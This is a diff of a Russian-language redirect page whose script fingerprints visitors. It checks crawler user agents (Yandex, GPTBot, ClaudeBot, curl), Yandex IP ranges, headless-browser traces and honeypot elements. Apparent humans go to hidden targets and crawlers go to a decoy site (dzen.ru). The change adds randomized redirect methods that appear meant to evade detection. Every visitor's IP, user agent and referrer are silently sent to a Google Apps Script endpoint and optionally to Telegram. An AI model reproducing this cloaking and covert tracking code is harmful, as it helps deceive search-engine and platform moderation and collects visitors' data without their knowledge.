@@ -7,57 +7,22 @@
     <title>Перенаправление</title>
     <style>
         *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-        :root{
-            --bg:#fff;--text:#1a1a2e;--accent:#4361ee;
-            --accent2:#3a0ca3;--muted:#6c757d;
-            --btn-bg:#4361ee;--btn-text:#fff;
-        }
-        @media(prefers-color-scheme:dark){:root{
-            --bg:#0f0f1a;--text:#e0e0e8;
-            --accent:#7b8cff;--accent2:#b5179e;--muted:#8d99ae;
-            --btn-bg:#7b8cff;--btn-text:#0f0f1a;
-        }}
-        body{
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,
-                        'Helvetica Neue',Arial,sans-serif;
-            background:var(--bg);color:var(--text);
-            display:flex;align-items:center;justify-content:center;
-            min-height:100vh;overflow:hidden;
-        }
+        :root{--bg:#fff;--text:#1a1a2e;--accent:#4361ee;--accent2:#3a0ca3;--muted:#6c757d;--btn-bg:#4361ee;--btn-text:#fff}
+        @media(prefers-color-scheme:dark){:root{--bg:#0f0f1a;--text:#e0e0e8;--accent:#7b8cff;--accent2:#b5179e;--muted:#8d99ae;--btn-bg:#7b8cff;--btn-text:#0f0f1a}}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}
         #_loader{text-align:center;padding:2rem}
         .spinner-ring{display:inline-block;width:64px;height:64px;margin-bottom:1.5rem}
-        .spinner-ring::after{
-            content:'';display:block;width:52px;height:52px;margin:6px;
-            border-radius:50%;
-            border:5px solid var(--accent);
-            border-color:var(--accent) transparent var(--accent2) transparent;
-            animation:spin 1.2s linear infinite;
-        }
+        .spinner-ring::after{content:'';display:block;width:52px;height:52px;margin:6px;border-radius:50%;border:5px solid var(--accent);border-color:var(--accent) transparent var(--accent2) transparent;animation:spin 1.2s linear infinite}
         @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
         .loader-text{font-size:1.1rem;color:var(--muted);margin-bottom:1rem}
-        .timer{font-size:2.5rem;font-weight:700;color:var(--accent);
-               font-variant-numeric:tabular-nums}
-        #_btn_area{display:none;flex-direction:column;align-items:center;
-                   gap:1rem;padding:2rem;text-align:center}
-        .btn-continue{
-            display:none;padding:.9rem 2.5rem;font-size:1.1rem;font-weight:600;
-            color:var(--btn-text);background:var(--btn-bg);border:none;
-            border-radius:12px;cursor:pointer;
-            transition:transform .15s,box-shadow .15s;
-            -webkit-tap-highlight-color:transparent;
-        }
-        .btn-continue:hover{transform:translateY(-2px);
-                            box-shadow:0 4px 16px rgba(67,97,238,.35)}
+        .timer{font-size:2.5rem;font-weight:700;color:var(--accent);font-variant-numeric:tabular-nums}
+        #_btn_area{display:none;flex-direction:column;align-items:center;gap:1rem;padding:2rem;text-align:center}
+        .btn-continue{display:none;padding:.9rem 2.5rem;font-size:1.1rem;font-weight:600;color:var(--btn-text);background:var(--btn-bg);border:none;border-radius:12px;cursor:pointer;transition:transform .15s,box-shadow .15s;-webkit-tap-highlight-color:transparent}
+        .btn-continue:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(67,97,238,.35)}
         .btn-continue:active{transform:translateY(0)}
         .btn-area-text{font-size:1rem;color:var(--muted)}
-        #_hp_lnk{position:fixed;left:-9999px;top:-9999px;
-                 width:1px;height:1px;opacity:.01;
-                 pointer-events:auto;font-size:1px;color:transparent}
-        @media(max-width:480px){
-            .timer{font-size:2rem}
-            .loader-text{font-size:1rem}
-            .btn-continue{padding:.8rem 2rem;font-size:1rem}
-        }
+        #_hp_lnk{position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:.01;pointer-events:auto;font-size:1px;color:transparent}
+        @media(max-width:480px){.timer{font-size:2rem}.loader-text{font-size:1rem}.btn-continue{padding:.8rem 2rem;font-size:1rem}}
     </style>
 </head>
 <body>
@@ -74,16 +39,14 @@
     </div>
     <noscript>
         <meta http-equiv="refresh" content="0; url=https://dzen.ru">
-        <p style="text-align:center;padding:2rem;font-family:sans-serif;">
-            Перенаправление на dzen.ru...
-        </p>
+        <p style="text-align:center;padding:2rem;font-family:sans-serif;">Перенаправление на dzen.ru...</p>
     </noscript>
     <script>
 (function() {
 try {
     'use strict';
 
-        var _CFG = {"checks": {"check_ip": true, "check_ua": true, "check_webdriver": true, "check_plugins": true, "check_webgl": true, "check_automation": true, "check_touch": true, "check_screen": true, "check_devtools": false, "check_localstorage": true, "check_honeypot_link": true, "check_honeypot_button": true, "check_referrer": true}, "thresholds": {"bot_score": 70, "suspect_score": 30}, "timing": {"delay_seconds": 5, "visit_limit": 5, "ban_hours": 2}, "blacklist_uas": ["YandexBot", "YandexAccessibilityBot", "YandexImages", "YandexVideo", "YandexMedia", "YandexBlogs", "YandexFavicons", "YandexWebmaster", "YandexPagechecker", "YandexImageResizer", "YandexAdNet", "YandexDirect", "YandexMetrika", "YandexNews", "YandexCalendar", "YandexSitelinks", "YandexScreenshotBot", "YandexMobileBot", "YandexRCA", "YandexPartner", "YandexTracker", "YandexVerticals", "YandexForDomain", "YandexSpravBot", "YandexSearchShop", "YandexMedianaBot", "YandexOntoDB", "YandexOntoDBAPI", "YandexTurbo", "YandexMarket", "AhrefsBot", "SemrushBot", "MJ12bot", "DotBot", "PetalBot", "BLEXBot", "DataForSeoBot", "serpstatbot", "Bytespider", "GPTBot", "ClaudeBot", "Sogou", "bingbot", "HeadlessChrome", "PhantomJS", "Puppeteer", "Selenium", "CasperJS", "Nightmare", "Playwright", "wget", "curl", "python-requests", "Go-http-client", "Java/", "Apache-HttpClient", "okhttp", "node-fetch", "axios"], "blacklist_ips": ["5.45.192.0/18", "5.255.192.0/18", "37.9.64.0/18", "37.140.128.0/18", "77.88.0.0/18", "87.250.224.0/19", "93.158.128.0/18", "95.108.128.0/17", "100.43.64.0/19", "130.193.32.0/19", "141.8.128.0/18", "178.154.128.0/17", "185.32.185.0/24", "185.71.76.0/22", "199.21.96.0/22", "199.36.240.0/22", "213.180.192.0/19"], "trusted_referrers": ["dzen.ru", "lytuloret.su", "vk.com"], "stats": {"gas_url": "https://script.google.com/macros/s/AKfycbwAjJNuY-Pl3hyK9eCKeyQ7LgFQP8pNT2A1GHgpF5ylFp5YordtVMSVRGS2KLAUhh1d/exec", "tg_token": "", "tg_chat_id": "", "tg_send_bots": true, "tg_send_humans": true, "tg_send_suspects": true}};
+        var _CFG = {"checks": {"check_ip": true, "check_ua": true, "check_webdriver": true, "check_plugins": true, "check_webgl": true, "check_automation": true, "check_touch": true, "check_screen": true, "check_devtools": false, "check_localstorage": true, "check_honeypot_link": true, "check_honeypot_button": true, "check_referrer": true}, "thresholds": {"bot_score": 70, "suspect_score": 30}, "timing": {"delay_seconds": 5, "visit_limit": 5, "ban_hours": 2}, "redirect_methods": ["location_replace", "anchor_click", "form_submit"], "blacklist_uas": ["YandexBot", "YandexAccessibilityBot", "YandexImages", "YandexVideo", "YandexMedia", "YandexBlogs", "YandexFavicons", "YandexWebmaster", "YandexPagechecker", "YandexImageResizer", "YandexAdNet", "YandexDirect", "YandexMetrika", "YandexNews", "YandexCalendar", "YandexSitelinks", "YandexScreenshotBot", "YandexMobileBot", "YandexRCA", "YandexPartner", "YandexTracker", "YandexVerticals", "YandexForDomain", "YandexSpravBot", "YandexSearchShop", "YandexMedianaBot", "YandexOntoDB", "YandexOntoDBAPI", "YandexTurbo", "YandexMarket", "AhrefsBot", "SemrushBot", "MJ12bot", "DotBot", "PetalBot", "BLEXBot", "DataForSeoBot", "serpstatbot", "Bytespider", "GPTBot", "ClaudeBot", "Sogou", "bingbot", "HeadlessChrome", "PhantomJS", "Puppeteer", "Selenium", "CasperJS", "Nightmare", "Playwright", "wget", "curl", "python-requests", "Go-http-client", "Java/", "Apache-HttpClient", "okhttp", "node-fetch", "axios"], "blacklist_ips": ["5.45.192.0/18", "5.255.192.0/18", "37.9.64.0/18", "37.140.128.0/18", "77.88.0.0/18", "87.250.224.0/19", "93.158.128.0/18", "95.108.128.0/17", "100.43.64.0/19", "130.193.32.0/19", "141.8.128.0/18", "178.154.128.0/17", "185.32.185.0/24", "185.71.76.0/22", "199.21.96.0/22", "199.36.240.0/22", "213.180.192.0/19"], "trusted_referrers": ["dzen.ru", "lytuloret.su", "vk.com"], "stats": {"gas_url": "https://script.google.com/macros/s/AKfycbwAjJNuY-Pl3hyK9eCKeyQ7LgFQP8pNT2A1GHgpF5ylFp5YordtVMSVRGS2KLAUhh1d/exec", "tg_token": "", "tg_chat_id": "", "tg_send_bots": true, "tg_send_humans": true, "tg_send_suspects": true}};
     var _LINKS = ["https://youtube.com", "https://google.com"];
     var _FALLBACK = "https://dzen.ru";
 
@@ -103,54 +66,71 @@ try {
     }
 
     function _redirect(url) {
-        try { window.location.replace(url); }
-        catch (e) { window.location.href = url; }
+        var methods = _CFG.redirect_methods;
+        if (!methods || methods.length === 0) { methods = ['location_replace']; }
+        var method = methods[Math.floor(Math.random() * methods.length)];
+        try {
+            if (method === 'anchor_click') {
+                var _a = document.createElement('a');
+                _a.href = url;
+                _a.style.display = 'none';
+                document.body.appendChild(_a);
+                _a.click();
+            } else if (method === 'form_submit') {
+                var _f = document.createElement('form');
+                _f.method = 'GET';
+                _f.action = url;
+                _f.style.display = 'none';
+                document.body.appendChild(_f);
+                _f.submit();
+            } else if (method === 'meta_refresh') {
+                var _m = document.createElement('meta');
+                _m.httpEquiv = 'refresh';
+                _m.content = '0;url=' + url;
+                document.head.appendChild(_m);
+            } else if (method === 'location_assign') {
+                window.location.assign(url);
+            } else if (method === 'location_href') {
+                window.location.href = url;
+            } else {
+                window.location.replace(url);
+            }
+        } catch (e) {
+            try { window.location.replace(url); }
+            catch (e2) { window.location.href = url; }
+        }
     }
 
     function _buildStatsData(result) {
         return {
             device: _isMobile() ? 'Mobile' : 'PC',
-            ip: _userIP || 'N/A',
-            rd: _rdNum,
-            result: result,
-            ua: navigator.userAgent,
-            referrer: document.referrer || '',
-            checks: JSON.stringify(_checkResults),
-            score: _score
+            ip: _userIP || 'N/A', rd: _rdNum, result: result,
+            ua: navigator.userAgent, referrer: document.referrer || '',
+            checks: JSON.stringify(_checkResults), score: _score
         };
     }
 
     function _sendStats(data) {
         var body = JSON.stringify(data);
-
         if (_CFG.stats.gas_url) {
             try {
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(_CFG.stats.gas_url, body);
-                } else {
-                    fetch(_CFG.stats.gas_url, {
-                        method: 'POST', body: body, keepalive: true
-                    }).catch(function() {});
-                }
+                if (navigator.sendBeacon) { navigator.sendBeacon(_CFG.stats.gas_url, body); }
+                else { fetch(_CFG.stats.gas_url, {method:'POST',body:body,keepalive:true}).catch(function(){}); }
             } catch (e) {}
         }
-
         if (_CFG.stats.tg_token && _CFG.stats.tg_chat_id) {
-            var sym = {PASS: '\u2705', BOT: '\u274c', SUSPECT: '\u26a0\ufe0f'};
+            var sym = {PASS:'\u2705',BOT:'\u274c',SUSPECT:'\u26a0\ufe0f'};
             var s = sym[data.result] || '\u2753';
-            var text = s + ' ' + data.result +
-                ' | rd=' + data.rd + ' | ' + data.device +
-                ' | Score: ' + data.score +
+            var text = s + ' ' + data.result + ' | rd=' + data.rd +
+                ' | ' + data.device + ' | Score: ' + data.score +
                 '\nUA: ' + (data.ua || '').substring(0, 100) +
                 '\nIP: ' + (data.ip || 'N/A') +
                 '\nRef: ' + (data.referrer || 'none') +
                 '\nChecks: ' + data.checks;
-
             var doSend = false;
-            if (data.result === 'BOT' && _CFG.stats.tg_send_bots) doSend = true;
-            if (data.result === 'PASS' && _CFG.stats.tg_send_humans) doSend = true;
-            if (data.result === 'SUSPECT' && _CFG.stats.tg_send_suspects) doSend = true;
-
+            if (data.result === 'BOT' && _CFG.stats.tg_send_bots) { doSend = true; }
+            if (data.result === 'PASS' && _CFG.stats.tg_send_humans) { doSend = true; }
+            if (data.result === 'SUSPECT' && _CFG.stats.tg_send_suspects) { doSend = true; }
             if (doSend) {
                 try {
                     var tgUrl = 'https://ap' + 'i.telegram.org/bo' + 't' +
@@ -158,9 +138,7 @@ try {
                     fetch(tgUrl, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            chat_id: _CFG.stats.tg_chat_id, text: text
-                        }),
+                        body: JSON.stringify({chat_id: _CFG.stats.tg_chat_id, text: text}),
                         keepalive: true
                     }).catch(function() {});
                 } catch (e) {}
@@ -177,18 +155,18 @@ try {
 
     function _ipToNum(ip) {
         var p = ip.split('.');
-        if (p.length !== 4) return null;
+        if (p.length !== 4) { return null; }
         return ((parseInt(p[0]) << 24) | (parseInt(p[1]) << 16) |
                 (parseInt(p[2]) << 8) | parseInt(p[3])) >>> 0;
     }
 
     function _ipInCIDR(ip, cidr) {
-        if (!ip || !cidr) return false;
+        if (!ip || !cidr) { return false; }
         var parts = cidr.split('/');
         var mask = parseInt(parts[1] || '32');
         var ipN = _ipToNum(ip);
         var cidrN = _ipToNum(parts[0]);
-        if (ipN === null || cidrN === null) return false;
+        if (ipN === null || cidrN === null) { return false; }
         var m = (-1 << (32 - mask)) >>> 0;
         return (ipN & m) === (cidrN & m);
     }
@@ -205,7 +183,7 @@ try {
 
 
     if (_CFG.checks.check_webdriver) {
-        if (navigator.webdriver === true) _addScore('webdriver', 100);
+        if (navigator.webdriver === true) { _addScore('webdriver', 100); }
     }
 
 
@@ -234,10 +212,8 @@ try {
             if (_gl) {
                 var _dbg = _gl.getExtension('WEBGL_debug_renderer_info');
                 if (_dbg) {
-                    var _rnd = (_gl.getParameter(
-                        _dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
-                    var _bad = ['swiftshader','llvmpipe',
-                                'mesa offscreen','microsoft basic render'];
+                    var _rnd = (_gl.getParameter(_dbg.UNMASKED_RENDERER_WEBGL) || '').toLowerCase();
+                    var _bad = ['swiftshader', 'llvmpipe', 'mesa offscreen', 'microsoft basic render'];
                     for (var _i = 0; _i < _bad.length; _i++) {
                         if (_rnd.indexOf(_bad[_i]) !== -1) {
                             _addScore('webgl_headless', 80);
@@ -252,20 +228,19 @@ try {
 
     if (_CFG.checks.check_automation) {
         var _ap = [
-            'callPhantom','__nightmare','domAutomation',
-            '_Selenium_IDE_Recorder','_selenium','calledSelenium',
-            '__webdriver_script_fn','__driver_evaluate',
-            '__webdriver_evaluate','__fxdriver_evaluate',
-            '__driver_unwrapped','__webdriver_unwrapped',
-            '__fxdriver_unwrapped','__selenium_unwrapped',
-            'ChromeDriverw','selenium',
+            'callPhantom', '__nightmare', 'domAutomation',
+            '_Selenium_IDE_Recorder', '_selenium', 'calledSelenium',
+            '__webdriver_script_fn', '__driver_evaluate',
+            '__webdriver_evaluate', '__fxdriver_evaluate',
+            '__driver_unwrapped', '__webdriver_unwrapped',
+            '__fxdriver_unwrapped', '__selenium_unwrapped',
+            'ChromeDriverw', 'selenium',
             'cdc_adoQpoasnfa76pfcZLmcfl_Array',
             'cdc_adoQpoasnfa76pfcZLmcfl_Promise',
             'cdc_adoQpoasnfa76pfcZLmcfl_Symbol'
         ];
         for (var _i = 0; _i < _ap.length; _i++) {
-            if (window[_ap[_i]] !== undefined ||
-                document[_ap[_i]] !== undefined) {
+            if (window[_ap[_i]] !== undefined || document[_ap[_i]] !== undefined) {
                 _addScore('automation_obj', 100);
                 break;
             }
@@ -282,7 +257,7 @@ try {
 
     if (_CFG.checks.check_screen && _isMobile()) {
         var _minDim = Math.min(screen.width || 0, screen.height || 0);
-        if (_minDim > 0 && _minDim < 360) _addScore('small_screen', 50);
+        if (_minDim > 0 && _minDim < 360) { _addScore('small_screen', 50); }
     }
 
 
@@ -293,7 +268,9 @@ try {
             var _banMs = _CFG.timing.ban_hours * 3600000;
             var _st = localStorage.getItem(_lsK);
             var _vis = [];
-            if (_st) { try { _vis = JSON.parse(_st); } catch (e) { _vis = []; } }
+            if (_st) {
+                try { _vis = JSON.parse(_st); } catch (e) { _vis = []; }
+            }
             _vis = _vis.filter(function(ts) { return (_now - ts) < _banMs; });
             if (_vis.length >= _CFG.timing.visit_limit) {
                 _addScore('too_many_visits', 100);
@@ -317,13 +294,13 @@ try {
                     break;
                 }
             }
-            if (_isTr) _addScore('trusted_referrer', -30);
+            if (_isTr) { _addScore('trusted_referrer', -30); }
         }
     }
 
 
     function _checkIP(ip) {
-        if (!_CFG.checks.check_ip || !ip) return;
+        if (!_CFG.checks.check_ip || !ip) { return; }
         for (var _i = 0; _i < _CFG.blacklist_ips.length; _i++) {
             var _e = _CFG.blacklist_ips[_i];
             if (_e.indexOf('/') !== -1) {
@@ -353,7 +330,7 @@ try {
     var _targetUrl = null;
 
     var metaR = document.querySelector('meta[http-equiv="refresh"]');
-    if (metaR) metaR.remove();
+    if (metaR) { metaR.remove(); }
 
     if (_rdNum >= 1 && _rdNum <= _LINKS.length) {
         _targetUrl = _LINKS[_rdNum - 1];
@@ -370,8 +347,8 @@ try {
     var _timerIv = setInterval(function() {
         var el = (Date.now() - _startTime) / 1000;
         var rem = Math.max(0, Math.ceil(_delay - el));
-        if (_timerEl) _timerEl.textContent = rem;
-        if (rem <= 0) clearInterval(_timerIv);
+        if (_timerEl) { _timerEl.textContent = rem; }
+        if (rem <= 0) { clearInterval(_timerIv); }
     }, 100);
 
     var _hasInteraction = false;
@@ -384,7 +361,8 @@ try {
     _getIP().then(function(ip) {
         _userIP = ip;
         _checkIP(ip);
-    }).catch(function() {}).then(function() {
+    }).catch(function() {
+    }).then(function() {
         var el = Date.now() - _startTime;
         var rem = Math.max(0, _delayMs - el);
         setTimeout(function() { _finalDecision(); }, rem);
@@ -396,30 +374,25 @@ try {
         }
         if (_isIOS() && _score > 0 && _score < 100) {
             var red = Math.floor(_score * 0.3);
-            if (red > 0) _addScore('ios_bonus', -red);
+            if (red > 0) { _addScore('ios_bonus', -red); }
         }
-
         var result = 'PASS';
-        if (_score >= _CFG.thresholds.bot_score) result = 'BOT';
-        else if (_score >= _CFG.thresholds.suspect_score) result = 'SUSPECT';
-
+        if (_score >= _CFG.thresholds.bot_score) { result = 'BOT'; }
+        else if (_score >= _CFG.thresholds.suspect_score) { result = 'SUSPECT'; }
         _sendStats(_buildStatsData(result));
-
-        if (result === 'PASS') _redirect(_targetUrl);
-        else if (result === 'SUSPECT') _showButton(_targetUrl);
-        else _redirect(_FALLBACK);
+        if (result === 'PASS') { _redirect(_targetUrl); }
+        else if (result === 'SUSPECT') { _showButton(_targetUrl); }
+        else { _redirect(_FALLBACK); }
     }
 
     function _showButton(tgtUrl) {
         var ld = document.getElementById('_loader');
-        if (ld) ld.style.display = 'none';
+        if (ld) { ld.style.display = 'none'; }
         var ba = document.getElementById('_btn_area');
         if (!ba) { _redirect(_FALLBACK); return; }
         ba.style.display = 'flex';
-
         var tb = document.getElementById('_trap_btn');
         var rb = document.getElementById('_real_btn');
-
         if (_CFG.checks.check_honeypot_button && tb && rb) {
             tb.style.display = 'inline-block';
             tb.addEventListener('click', function(ev) {
